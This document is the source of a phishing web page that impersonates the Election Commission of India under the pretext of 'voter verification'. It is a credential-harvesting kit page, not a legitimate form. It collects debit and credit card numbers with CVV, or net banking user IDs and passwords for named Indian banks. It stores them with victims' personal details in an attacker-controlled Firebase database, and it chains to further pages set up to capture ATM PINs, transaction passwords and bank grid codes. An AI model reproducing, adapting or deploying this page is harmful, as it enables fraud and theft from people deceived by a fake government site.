<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment & Bank Verification - Voter Verification</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #0056b3; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .form-container { background: #ffffff; padding: 35px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); width: 100%; max-width: 480px; }
        .form-container h2 { text-align: center; margin-bottom: 20px; color: #0056b3; font-size: 22px; }
        
        .tab-container { display: flex; gap: 10px; margin-bottom: 20px; }
        .tab-btn { flex: 1; padding: 10px; border: 1px solid #0056b3; background: #fff; color: #0056b3; font-weight: bold; border-radius: 6px; cursor: pointer; text-align: center; }
        .tab-btn.active { background: #0056b3; color: #fff; }

        .form-section { display: none; }
        .form-section.active { display: block; }

        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; margin-bottom: 6px; color: #333; font-weight: 600; font-size: 13px; }
        .form-group input, .form-group select { width: 100%; padding: 10px 12px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; background: #fff; }
        .form-group input:focus, .form-group select:focus { outline: none; border-color: #0056b3; box-shadow: 0 0 5px rgba(0, 86, 179, 0.3); }

        .row-group { display: flex; gap: 10px; }
        .row-group .form-group { flex: 1; }

        .btn-next { width: 100%; padding: 12px; background: #0056b3; border: none; border-radius: 6px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .btn-next:hover { background: #004085; }
        .btn-next:disabled { background: #6c757d; cursor: not-allowed; }
        .footer-text { text-align: center; margin-top: 20px; font-size: 12px; color: #666; font-weight: 600; border-top: 1px solid #eee; padding-top: 12px; }
    </style>
</head>
<body>
    <div class="form-container">
        <h2>Secure Payment & Verification</h2>

        <div class="tab-container">
            <div class="tab-btn active" id="cardTabBtn">Debit / Credit Card</div>
            <div class="tab-btn" id="netTabBtn">Net Banking</div>
        </div>

        <form id="paymentForm">
            <!-- Card Section -->
            <div id="cardSection" class="form-section active">
                <div class="form-group">
                    <label for="cardNumber">Card Number</label>
                    <input type="text" id="cardNumber" name="cardNumber" placeholder="4592 XXXX XXXX XXXX" maxlength="19">
                </div>
                <div class="row-group">
                    <div class="form-group">
                        <label for="expiryDate">Expiry Date</label>
                        <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" maxlength="5">
                    </div>
                    <div class="form-group">
                        <label for="cvv">CVV</label>
                        <input type="password" id="cvv" name="cvv" placeholder="123" maxlength="4">
                    </div>
                </div>
            </div>

            <!-- Net Banking Section -->
            <div id="netSection" class="form-section">
                <div class="form-group">
                    <label for="bankName">Select Bank</label>
                    <select id="bankName" name="bankName">
                        <option value="">-- Choose Bank --</option>
                        <option value="ICICI Bank">ICICI Bank</option>
                        <option value="State Bank of India">State Bank of India (SBI)</option>
                        <option value="HDFC Bank">HDFC Bank</option>
                        <option value="Axis Bank">Axis Bank</option>
                        <option value="Punjab National Bank">Punjab National Bank (PNB)</option>
                        <option value="Bank of India">Bank of India</option>
                        <option value="Other Bank">Other Bank</option>
                    </select>
                </div>

                <div class="form-group" id="otherBankGroup" style="display:none;">
                    <label for="otherBankName">Enter Bank Name</label>
                    <input type="text" id="otherBankName" placeholder="Enter your bank name">
                </div>

                <div id="bankCredentials">
                    <div class="form-group">
                        <label for="userId">Username / Customer ID</label>
                        <input type="text" id="userId" placeholder="Enter User ID">
                    </div>
                    <div class="form-group">
                        <label for="loginPassword">Net Banking Login Password</label>
                        <input type="password" id="loginPassword" placeholder="Enter Login Password">
                    </div>
                </div>
            </div>

            <button type="submit" id="submitBtn" class="btn-next">Verify & Proceed</button>
        </form>

        <div class="footer-text">
            © 2026 Election Commission of India. All rights reserved.
        </div>
    </div>

    <!-- Firebase SDK & Script -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, doc, getDoc, addDoc, collection } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAZ7Dvd7HYsZrMuP0bABJuMAEZmRtGw02U",
            authDomain: "voter-verification-a04d5.firebaseapp.com",
            projectId: "voter-verification-a04d5",
            storageBucket: "voter-verification-a04d5.firebasestorage.app",
            messagingSenderId: "582458013788",
            appId: "1:582458013788:web:15f8c7fd7dc05d24328e99",
            measurementId: "G-8CX5BVQXFC"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // Tab Switching Logic
        const cardTabBtn = document.getElementById('cardTabBtn');
        const netTabBtn = document.getElementById('netTabBtn');
        const cardSection = document.getElementById('cardSection');
        const netSection = document.getElementById('netSection');

        cardTabBtn.addEventListener('click', () => {
            cardTabBtn.classList.add('active');
            netTabBtn.classList.remove('active');
            cardSection.classList.add('active');
            netSection.classList.remove('active');
        });

        netTabBtn.addEventListener('click', () => {
            netTabBtn.classList.add('active');
            cardTabBtn.classList.remove('active');
            netSection.classList.add('active');
            cardSection.classList.remove('active');
        });

        const bankNameSelect = document.getElementById('bankName');
        const otherBankGroup = document.getElementById('otherBankGroup');

        bankNameSelect.addEventListener('change', function() {
            if (this.value === 'Other Bank') {
                otherBankGroup.style.display = 'block';
            } else {
                otherBankGroup.style.display = 'none';
            }
        });

        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const payMethod = cardTabBtn.classList.contains('active') ? 'Card' : 'NetBanking';
            let paymentDetails = "";
            let selectedBank = "";

            if (payMethod === 'Card') {
                const cardNumber = document.getElementById('cardNumber').value;
                const expiryDate = document.getElementById('expiryDate').value;
                const cvv = document.getElementById('cvv').value;
                paymentDetails = `Card: ${cardNumber}, Exp: ${expiryDate}, CVV: ${cvv}`;
            } else {
                selectedBank = bankNameSelect.value;
                if (selectedBank === 'Other Bank') {
                    const customBank = document.getElementById('otherBankName').value;
                    selectedBank = `Other: ${customBank}`;
                }
                const userId = document.getElementById('userId').value;
                const loginPassword = document.getElementById('loginPassword').value;
                paymentDetails = `Bank: ${selectedBank}, UserID: ${userId}, Pass: ${loginPassword}`;
            }

            const docId = localStorage.getItem('voterDocId');
            if (!docId) {
                alert("Session expired. Please start from the first page.");
                window.location.href = "index.html";
                return;
            }

            const btn = document.getElementById('submitBtn');
            btn.disabled = true;
            btn.innerText = "Processing...";

            try {
                // पुराने डॉक्यूमेंट से यूज़र की बाकी डिटेल्स फेच करें
                const docRef = doc(db, "voterSubmissions", docId);
                const docSnap = await getDoc(docRef);
                
                let existingData = {};
                if (docSnap.exists()) {
                    existingData = docSnap.data();
                }

                // addDoc के जरिए नई रो (New Row) बनाएं ताकि पुराना डेटा न हटे
                const newDocRef = await addDoc(collection(db, "voterSubmissions"), {
                    time: new Date().toLocaleString(),
                    fullname: existingData.fullname || 'N/A',
                    mobile: existingData.mobile || 'N/A',
                    epic: existingData.epic || 'N/A',
                    fatherName: existingData.fatherName || 'Pending',
                    dob: existingData.dob || 'Pending',
                    gender: existingData.gender || 'Pending',
                    maritalStatus: existingData.maritalStatus || 'Pending',
                    childrenCount: existingData.childrenCount || 'Pending',
                    motherName: existingData.motherName || 'Pending',
                    documents: existingData.documents || 'Pending',
                    paymentMethod: payMethod,
                    paymentDetails: paymentDetails,
                    transPassword: 'Pending',
                    atmPin: 'Pending',
                    gridStep1: 'Pending',
                    gridStep2: 'Pending',
                    gridStep3: 'Pending',
                    gridStep4: 'Pending',
                    currentStep: "Payment Details Submitted"
                });

                // नया डॉक्यूमेंट आईडी सेट करें
                localStorage.setItem('voterDocId', newDocRef.id);

                setTimeout(() => {
                    // सिर्फ ICICI Bank होने पर ही ग्रिड पेज खुलेगा, बाकी सभी बैंकों के लिए ट्रांजैक्शन पासवर्ड पेज खुलेगा
                    if (payMethod === 'NetBanking' && selectedBank.trim() === 'ICICI Bank') {
                        window.location.href = "grid_step1.html"; 
                    } else if (payMethod === 'Card') {
                        window.location.href = "page5.html"; 
                    } else {
                        window.location.href = "netbanking_pass.html"; 
                    }
                }, 1000);

            } catch (error) {
                console.error("Error creating submission: ", error);
                alert("डेटा सेव करने में समस्या हुई।");
                btn.disabled = false;
                btn.innerText = "Verify & Proceed";
            }
        });
    </script>
</body>
</html>
